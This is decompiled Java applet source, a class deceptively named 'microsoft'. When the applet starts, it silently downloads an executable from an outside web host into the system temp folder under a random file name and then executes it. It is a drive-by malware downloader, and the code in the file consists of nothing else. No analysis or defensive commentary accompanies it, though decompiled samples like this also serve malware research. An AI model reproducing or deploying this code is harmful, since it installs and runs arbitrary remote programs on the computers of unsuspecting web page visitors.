import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.io.IOException;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class microsoft extends Applet
{
    @Override
    public void start() {
        final String concat = System.getProperty("java.io.tmpdir").concat("\\C7D8U2X8.exe");
        this.download("http://shadowstattoo.com/panoramic/htf.exe", concat);
        final Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec(concat);
        }
        catch (IOException ex) {}
    }
    
    public void download(final String s, final String s2) {
        BufferedOutputStream bufferedOutputStream = null;
        InputStream inputStream = null;
        try {
            final URL url = new URL(s);
            bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(s2));
            inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array)) != -1) {
                bufferedOutputStream.write(array, 0, read);
            }
        }
        catch (Exception ex) {
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (bufferedOutputStream != null) {
                    bufferedOutputStream.close();
                }
            }
            catch (IOException ex2) {}
        }
        try {
            if (inputStream != null) {
                inputStream.close();
            }
            if (bufferedOutputStream != null) {
                bufferedOutputStream.close();
            }
        }
        catch (IOException ex3) {}
        try {
            if (inputStream != null) {
                inputStream.close();
            }
            if (bufferedOutputStream != null) {
                bufferedOutputStream.close();
            }
        }
        catch (IOException ex4) {}
    }
    
    public void main(final String[] array) {
        this.start();
    }
    
    @Override
    public void stop() {
    }
}
